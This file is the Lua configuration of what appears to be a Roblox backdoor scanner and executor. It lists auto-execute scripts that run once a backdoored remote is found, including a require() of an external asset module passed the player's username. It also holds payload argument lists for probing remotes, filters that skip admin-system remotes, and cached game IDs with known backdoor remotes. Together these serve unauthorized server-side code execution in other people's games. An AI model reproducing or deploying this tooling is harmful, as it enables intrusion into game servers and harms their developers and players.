-- objects
local player = game:GetService("Players").LocalPlayer

-- main
return {
	["configVer"] = 9, -- Don't touch this!
	
	-- @tweaks
	["enableLogging"] = true, -- Logs anything that happens
	["redirectOutput"] = false, -- Redirects output to console
	["redirectRemote"] = true, -- Uses a custom-created remote for server-side execution

	-- @customization
	-- Scripts that execute after a backdoor is found
	-- You can add any scripts here
	["autoExec"] = {
		[[require(125992639027440)["Require.EXE by E God"](%username%)]],
		[[print("Heheheheh. umm *splashes all over table*")]],
		[[print(%backdoorRem%)]],
	},

	-- Remote filters that you don't want to be scanned
	-- Should be thread-safe
	["remoteFilters"] = {
		["AdminRemotes"] = function(remoteObj)
			local remoteObjPath = remoteObj:GetFullName()
			return remoteObj:IsDescendantOf(game:GetService("ReplicatedStorage")) and 
				(string.find(remoteObjPath, "HDAdminClient") or string.find(remoteObjPath, "Basic Admin Essentials"))
		end,
		["AdonisRemotes"] = function(remoteObj)
			return (
				(remoteObj.Parent and remoteObj.Parent:IsA("ReplicatedStorage") and remoteObj:FindFirstChild("__FUNCTION")) or
				(remoteObj.Name == "__FUNCTION" and remoteObj.Parent:IsA("RemoteEvent") and remoteObj.Parent.Parent:IsA("ReplicatedStorage"))
			)
		end,
		["RespawnRemotes"] = function(remoteObj)
			local remoteObjName = string.lower(remoteObj.Name)
			return string.find(remoteObjName, "respawn")
		end,
		["SkidCannonRemotes"] = function(remoteObj)
			local remoteObjPath = remoteObj:GetFullName()
			return string.find(remoteObjPath, "JointsService") and 
				(string.find(remoteObjPath, "Lightning Cannon") or string.find(remoteObjPath, " Cannon"))
		end,
		["RobloxReplicatedStorage"] = function(remoteObj)
			return remoteObj:IsDescendantOf(game:GetService("RobloxReplicatedStorage"))
		end,
		["RedirectedRemote"] = function(remoteObj)
			return remoteObj:GetAttribute("isNonced")
		end,
		["TeleportReserved"] = function(remoteObj)
			return string.lower(remoteObj.Name) == "teleportreserved"
		end,
	},

	-- Macro shenanigans you can add here
	-- Prefixed as "%macro%" | Example: %username% -> "Roblox", %plr_pos% -> Vector3
	["scriptMacros"] = {
		["username"] = player.Name,
		["userid"] = player.UserId,
		["placeid"] = game.PlaceId,
		["backdoorRem"] = _G.backdoorRem,
	},

	["backdoorPayloads"] = {
    ["default"] = {
        ["Args"] = {
            "source", 
            "Heheheheh, admin kontol by @sptzy", 
	    "Execute",
            "exec", 
            "123", 
            "abc", 
            "talk", 
            "chat", 
            "speak", 
            "%username%",
	    "backdoor",
	    "sit",
	    "fire",
	    "remote",
            -- Woof
        },
        ["Priority"] = 1,
    },
},

	-- Cached backdoor remotes
	["cachedPlaces"] = {
		[5033592164] = {
			["Remote"] = game:GetService("ReplicatedStorage"):FindFirstChildWhichIsA("RemoteEvent"),
			["Args"] = {"1234567890", "source"},
		},
		[6879465970] = {
			["Remote"] = "ReplicatedStorage.RemoteEvent",
			["Args"] = {"source"},
		},
	},
}
